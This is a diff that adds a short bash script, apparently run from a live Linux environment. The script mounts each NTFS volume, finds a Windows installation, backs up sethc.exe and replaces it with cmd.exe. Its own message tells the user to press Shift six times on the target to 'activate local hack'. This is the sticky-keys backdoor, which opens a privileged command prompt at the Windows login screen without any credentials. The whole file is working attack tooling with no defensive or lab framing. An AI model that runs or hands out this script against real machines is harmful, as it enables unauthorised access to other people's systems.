@@ -1,0 +1,27 @@
+#!/bin/bash
+
+create_sticky_keys() {
+	if [ ! -e /tmp/mnt/Windows/System32/sethc.exe.orig ]; then
+		echo "Making backup of sethc.exe."
+		cp -r /tmp/mnt/Windows/System32/sethc.exe /tmp/mnt/Windows/System32/sethc.exe.orig
+	fi
+	echo "Replacing sethc with cmd. Press shift 6 times on target to activate local hack."
+	cp -r /tmp/mnt/Windows/System32/cmd.exe /tmp/mnt/Windows/System32/sethc.exe
+}
+
+
+mkdir -p /tmp/mnt
+
+echo "Looking for NTFS volumes..."
+set -e $(blkid -o list | grep -v "ntfs-3g" | awk '/ntfs/{print $1}')
+while [ ! -z ${1} ]
+do
+	echo "Checking NTFS volume ${1} for windows installation"
+	ntfs-3g ${1} /tmp/mnt
+	if [ -e /tmp/mnt/Windows/Temp ]; then
+		echo "Found windows partition at ${1}"
+		create_sticky_keys
+	fi
+	umount /tmp/mnt
+	shift
+done
